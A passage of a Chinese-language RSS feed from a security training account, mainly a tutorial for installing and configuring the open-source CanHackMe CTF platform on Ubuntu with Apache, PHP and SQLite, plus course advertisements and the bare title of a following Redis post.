data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-10-102166928</guid>
<pubDate>Fri, 10 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF平台搭建：CanHackMe</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101994123.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101994123&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8eec1bba32fd0da619e3282f391992b4_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;CanHackMe🎯&lt;/h2&gt;&lt;p&gt;一个基于 php 的 CTF 开源平台。&lt;/p&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//canhack.me/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;ht&lt;/a&gt;tps://canhack.me/&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;搭建环境📐&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境（Ubuntu 16.04+Apache 2.4+PHP 7.3）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安装 Apache 2.4&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt update
sudo apt install apache2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后检查是否成功：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;apache2 -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装 PHP 7.3&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt-get install software-properties-common
sudo add-apt-repository ppa:ondrej/php
sudo apt-get update
sudo apt-get install -y php7.3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;检查是否成功：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装 Sqlite3&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;SQLite 是一个软件库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是在世界上最广泛部署的 SQL 数据库引擎。SQLite 源代码不受版权限制。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;安装 php-sqlite3 模块&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php7.3-sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里需要注意，要修改 php.ini 文件 /etc/php/7.3/apache2/php.ini，把前面的分号去掉&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;安装 php-mbstring 模块&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php-mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同样的，需要修改 php.ini 文件 /etc/php/7.3/apache2/php.ini，把前面的分号去掉&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;项目搭建&lt;/h2&gt;&lt;p&gt;&lt;b&gt;下载&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先下载项目，直接下载上传：&lt;/p&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;git 方式下载：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;git clone https://github.com/safflower/canhackme&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;配置路由&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先配置路由，修改 apache2 配置文件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;vim /etc/apache2/apache2.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把路径改成你实际的网站根目录，AllowOverride None 改为 AllowOverride ALL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;Directory /var/www/html&amp;gt;
        Options Indexes FollowSymLinks
        AllowOverride ALL
        Require all granted
&amp;lt;/Directory&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;开启 mod_rewrite 模块&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启 apache2&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;service apache2 restart&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;导入 .sql 数据库文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入到 @import/confs/ 目录下，导入 init.sql 文件到 sqlite3&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite3 .common.db &amp;lt; init.sql
root@linuz:/var/www/html/@import/confs# sqlite3 .common.db
SQLite version 3.11.0 2016-02-15 17:29:24
Enter &amp;#34;.help&amp;#34; for usage hints.
sqlite&amp;gt; .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `users` (
        `user_no` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        `user_name` TEXT NOT NULL UNIQUE,
        `user_email` TEXT NOT NULL UNIQUE,
        `user_password` TEXT NOT NULL,
        `user_comment` TEXT NOT NULL,
        `user_score` INTEGER NOT NULL,
        `user_signed_up_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
......
sqlite&amp;gt; .exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后更改 confs 目录权限为 www-data&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo chown -R www-data:www-data confs/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;设置 recaptcha&lt;/b&gt;&lt;/p&gt;&lt;p&gt;recaptcha 地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.google.com/recaptcha&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;google.com/recaptcha&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;在上面注册你的平台网站（选择 recaptcha 第3版）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后获取秘钥：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在平台的配置文件common.php里面，修改一些网站的基本信息，包括网站URL、作者信息等&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;更换秘钥&lt;/b&gt;&lt;/p&gt;&lt;p&gt;第一个密钥替换 common.php 文件里的 recaptcha_sitekey 内容&lt;/p&gt;&lt;p&gt;第二个密钥编辑成 .recaptcha_secretkey.txt 文件，放到 @import/confs 路径下&lt;/p&gt;&lt;h2&gt;创建题目&lt;/h2&gt;&lt;p&gt;平台没有后台，所以只能直接访问 sqlite3 数据库添加题目&lt;/p&gt;&lt;p&gt;添加题目命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;chals&amp;#34; VALUES(1,&amp;#39;name&amp;#39;,&amp;#39;title&amp;#39;,&amp;#39;contents&amp;#39;,100,&amp;#39;CanHackMe{xxxxxxxxxxxx}&amp;#39;,&amp;#39;web&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2019-09-12&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看题目：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;发送公告：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;notis&amp;#34; VALUES(1,&amp;#39;xxx&amp;#39;,1,&amp;#39;2020-01-09&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;设置 flag&lt;/b&gt;&lt;/p&gt;&lt;p&gt;flag 的默认的格式为 CanHackMe{...} 且长度不小于 10 位数，可以在 init.php 文件中修改。&lt;/p&gt;&lt;p&gt;把 CanHackMe 修改成你想要的格式：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;PS：&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-09-101994123</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>帮转转</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101955934.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101955934&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;&lt;b&gt;                                                                 点进去，直接玩&lt;/b&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-09-101955934</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>Windows下Redis Getshell总结</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-08-101701119.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101701119&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
